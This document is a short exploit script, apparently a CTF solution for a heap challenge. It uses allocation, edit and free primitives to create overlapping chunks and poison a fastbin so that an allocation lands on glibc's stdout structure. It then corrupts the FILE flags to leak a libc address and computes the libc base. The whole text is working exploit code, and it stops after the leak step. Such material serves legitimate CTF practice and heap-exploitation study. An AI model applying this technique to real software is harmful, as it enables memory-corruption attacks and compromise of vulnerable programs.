def exploit():
	add(0x88, 'a'*0x10)			#0
	add(0x218, 'b'*0x10)		#1
	add(0x108, 'c'*0x10)		#2
	add(0x80, 'd'*0x10)			#3


	#fake
	edit(1, 0x100, 'a'*0xf0 + p64(0x100) + p64(0x101))
	#into unsorted bin
	free(1)
	free(0)
	add(0x88, 'a'*0x10)
	edit(0, 0x88, 'a'*0x88)

	#split from 1					
	add(0x88, 'b1')				#1
	add(0x68, 'b2')				#4
	add(0x88, 'b3')				#5

	free(1)		
	free(2)						#overlapping above b

	free(4)						#into fastbin

	add(0x88, 'over')			#1	

	#overwrite fastbin'fd to stdout 错位即可拿到IO_stdout
	add(0x290, '')				#2
	edit(2, '\xdd\x45')			

	free(1)
	add(0x88, 'a'*0x80 + p64(0x91) + p64(0x71))	#1 modify size to 0x71 fastbin

	free(5)
	dbg()					
	add(0x68, 'padding')		#4
	add(0x68, 'stdout')			#5

	edit(5, 'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
	data = p.recv(0x90)
  	leak = u64(data[0x88:])                                 #io_file jump
  	print "leak ==> " + hex(leak)

  	if leak&0x7f00000008e0 == 0x7f00000008e0:

	  	libc_base = leak - libc.symbols['_IO_2_1_stdin_']	# or __IO_file_jumps
	  	print "libc_base ==> " + hex(libc_base)